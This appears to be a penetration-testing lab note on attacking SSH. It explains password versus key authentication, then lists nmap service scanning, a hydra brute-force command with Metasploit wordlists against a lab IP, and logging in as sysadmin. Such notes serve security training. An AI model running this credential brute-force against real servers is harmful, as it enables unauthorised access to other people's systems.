#### Exploiting SSH
- SSH (Secure Shell) is a remote administrator protocol that offers encryption and is the successor to telnet.
- It is typically used for remote access to servers and systems
- SSH uses TCP port 22 by default,however like other services,it can be configured to use any other open TCP port.
- SSH Authentication can be configured in two ways:
- - Username & password authentication
- - Username & password authentication
- - Key based authentication
- In the case of username and password authentication,we can perform a brute-force attack on the SSH server in order to identify legitimate credentials consequently gain access to the target system.
#### Practicle
- nmap -sV 192.156.211.3 [ for checking services ]
- hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/wordlists/common_passwords.txt 192.156.211.3 -t 4 ssh
- ssh sysadmin@192.156.211.3 [ for accessing sysadmin account through ssh ]
- whoami
- groups sysadmin [ to check which group sysadmin belongs to ]
